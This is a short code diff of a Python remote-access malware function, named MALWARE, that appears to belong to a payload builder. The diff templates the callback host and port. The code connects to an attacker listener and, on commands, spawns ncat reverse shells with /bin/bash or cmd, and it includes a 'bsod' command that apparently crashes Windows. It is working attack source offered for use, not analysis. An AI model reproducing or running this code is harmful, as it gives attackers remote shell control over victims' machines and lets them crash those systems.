@@ -100,8 +100,8 @@ from flask import Flask, render_template, Response, url_for
 
 
 def MALWARE():
-    LHOST = "127.0.0.1"
-    LPORT = 833
+    LHOST = "{LHOST}"
+    LPORT = {LPORT}
 
     SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     SOCKET.connect((LHOST, LPORT))
@@ -110,10 +110,10 @@ def MALWARE():
         MALWARE_RECV = SOCKET.recv(8000).decode()
         
         if MALWARE_RECV == "zombie -l":
-           os.system("ncat 192.168.1.26 834 -e /bin/bash")
+           os.system("ncat {LHOST} {LPORT} -e /bin/bash")
            
         if MALWARE_RECV == "zombie -w":
-           os.system("ncat 192.168.1.26 835 -e cmd")
+           os.system("ncat {LHOST} {LPORT} -e cmd")
            
         if MALWARE_RECV == "bsod":
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
